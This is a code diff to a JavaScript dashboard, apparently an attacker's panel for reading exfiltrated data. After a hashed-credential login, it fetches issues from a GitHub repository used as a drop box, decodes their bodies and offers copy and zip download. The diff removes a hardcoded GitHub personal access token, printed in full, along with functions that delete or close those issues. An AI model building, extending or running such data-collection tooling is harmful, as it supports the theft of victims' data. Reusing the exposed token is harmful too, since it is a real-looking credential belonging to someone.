@@ -3,7 +3,6 @@
 
     const HASH_USER = '0ca1574299693aaeb821647cf4c897a153bea29fafb12db28257a1ed61ce58d0';
     const HASH_PASS = '7ef461cec5e3f823e0724d62cb57b46e875a8690f1c1917c4d773cb2cb5a86ed';
-    const GITHUB_TOKEN = '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';
     const REPO = 'va1uxxx/0xB0';
     const API_URL = `https://api.github.com/repos/${REPO}/issues`;
 
@@ -18,8 +17,7 @@
         const refreshBtn = document.getElementById('refreshBtn');
         const logoutBtn = document.getElementById('logoutBtn');
         const downloadBtn = document.getElementById('downloadBtn');
-        const deleteAllBtn = document.getElementById('deleteAllBtn');
-        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn, deleteAllBtn };
+        return { loginPage, dashboardPage, loginForm, usernameInput, passwordInput, loginError, logContainer, refreshBtn, logoutBtn, downloadBtn };
     }
 
     async function hashString(str) {
@@ -53,7 +51,7 @@
     function showDashboard() {
         const els = getElements();
         if (!els.loginPage || !els.dashboardPage) {
-            console.error('Elements missing: loginPage or dashboardPage not found.');
+            console.error('Elements missing.');
             return;
         }
         els.loginPage.style.display = 'none';
@@ -66,7 +64,7 @@
     function showLogin() {
         const els = getElements();
         if (!els.loginPage || !els.dashboardPage) {
-            console.error('Elements missing: loginPage or dashboardPage not found.');
+            console.error('Elements missing.');
             return;
         }
         els.loginPage.style.display = 'block';
@@ -82,10 +80,7 @@
 
     async function fetchExfilData() {
         const els = getElements();
-        if (!els.logContainer) {
-            console.error('logContainer missing.');
-            return;
-        }
+        if (!els.logContainer) return;
         const placeholder = `<div class="placeholder"><i class="fas fa-spinner spinner"></i> FETCHING DATA...</div>`;
         els.logContainer.innerHTML = placeholder;
         try {
@@ -98,10 +93,9 @@
                 els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-inbox"></i> NO DATA RECEIVED</div>`;
                 return;
             }
-            // Filter open issues only
             const openIssues = issues.filter(i => i.state === 'open');
             if (openIssues.length === 0) {
-                els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-check-circle"></i> ALL CLEAR (no open issues)</div>`;
+                els.logContainer.innerHTML = `<div class="placeholder"><i class="fas fa-check-circle"></i> ALL CLEAR</div>`;
                 return;
             }
             const sorted = openIssues.slice().reverse();
@@ -109,7 +103,6 @@
             sorted.forEach((issue) => {
                 const title = escapeHtml(issue.title || 'Untitled');
                 const time = new Date(issue.created_at).toLocaleString();
-                const issueNumber = issue.number;
                 let body = issue.body || '';
                 let decoded = '';
                 let isTruncated = false;
@@ -125,9 +118,9 @@
                 const displayBody = escapeHtml(decoded);
                 const truncatedMark = isTruncated ? ' <span style="color:#4a5a6a;">… (truncated)</span>' : '';
                 html += `
-                    <div class="entry" data-issue="${issueNumber}">
+                    <div class="entry">
                         <div class="entry-header">
-                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>#${issueNumber} - ${title}</span>
+                            <span class="entry-title"><i class="fas fa-file-alt" style="color:#4a5a6a;margin-right:8px;"></i>${title}</span>
                             <span class="entry-time"><i class="far fa-clock"></i> ${time}</span>
                         </div>
                         <div class="entry-body">
@@ -135,7 +128,6 @@
                         </div>
                         <div style="text-align:right;margin-top:6px;">
                             <button class="copy-btn" data-copy="${escapeHtml(decoded)}"><i class="fas fa-copy"></i> COPY</button>
-                            <button class="delete-btn" data-issue="${issueNumber}"><i class="fas fa-trash-alt"></i> DELETE</button>
                         </div>
                     </div>
                 `;
@@ -153,79 +145,9 @@
                 });
             });
 
-            document.querySelectorAll('.delete-btn').forEach(btn => {
-                btn.addEventListener('click', function() {
-                    const issueNum = parseInt(this.getAttribute('data-issue'));
-                    if (confirm(`Delete/Close issue #${issueNum}?`)) {
-                        deleteOrCloseIssue(issueNum);
-                    }
-                });
-            });
-
         } catch (err) {
             els.logContainer.innerHTML = `<div class="error-msg"><i class="fas fa-triangle-exclamation"></i> ERROR: ${escapeHtml(err.message)}</div>`;
         }
-    }
-
-    // Try DELETE first, fallback to CLOSE
-    async function deleteOrCloseIssue(issueNumber) {
-        const url = `https://api.github.com/repos/${REPO}/issues/${issueNumber}`;
-        const headers = {
-            'Authorization': `token ${GITHUB_TOKEN}`,
-            'Accept': 'application/vnd.github.v3+json',
-            'Content-Type': 'application/json'
-        };
-
-        // Attempt DELETE
-        try {
-            const delRes = await fetch(url, { method: 'DELETE', headers });
-            if (delRes.ok) {
-                alert(`Issue #${issueNumber} deleted successfully.`);
-                fetchExfilData();
-                return;
-            }
-            // If 403/404, try CLOSE instead
-            if (delRes.status === 403 || delRes.status === 404 || delRes.status === 401) {
-                console.warn(`DELETE failed (${delRes.status}), attempting CLOSE.`);
-                const closeRes = await fetch(url, {
-                    method: 'PATCH',
-                    headers,
-                    body: JSON.stringify({ state: 'closed' })
-                });
-                if (closeRes.ok) {
-                    alert(`Issue #${issueNumber} closed (moved to archive).`);
-                    fetchExfilData();
-                    return;
-                } else {
-                    const errText = await closeRes.text();
-                    alert(`CLOSE failed: HTTP ${closeRes.status} - ${errText}`);
-                }
-            } else {
-                const errText = await delRes.text();
-                alert(`DELETE failed: HTTP ${delRes.status} - ${errText}`);
-            }
-        } catch (err) {
-            alert(`Error: ${err.message}`);
-        }
-    }
-
-    async function deleteAllIssues() {
-        if (!confirm('Delete/Close ALL open issues? This cannot be undone.')) return;
-        const els = getElements();
-        if (!els.logContainer) return;
-        const entries = els.logContainer.querySelectorAll('.entry');
-        if (entries.length === 0) {
-            alert('No open issues to delete.');
-            return;
-        }
-        const issueNumbers = Array.from(entries).map(entry => parseInt(entry.dataset.issue));
-        let deleted = 0;
-        for (const num of issueNumbers) {
-            await deleteOrCloseIssue(num);
-            deleted++;
-        }
-        alert(`Processed ${deleted} issues. Refresh to see remaining.`);
-        fetchExfilData();
     }
 
     function escapeHtml(str) {
@@ -318,10 +240,6 @@
 
         if (els.downloadBtn) {
             els.downloadBtn.addEventListener('click', downloadZip);
-        }
-
-        if (els.deleteAllBtn) {
-            els.deleteAllBtn.addEventListener('click', deleteAllIssues);
         }
 
         if (isLoggedIn()) {
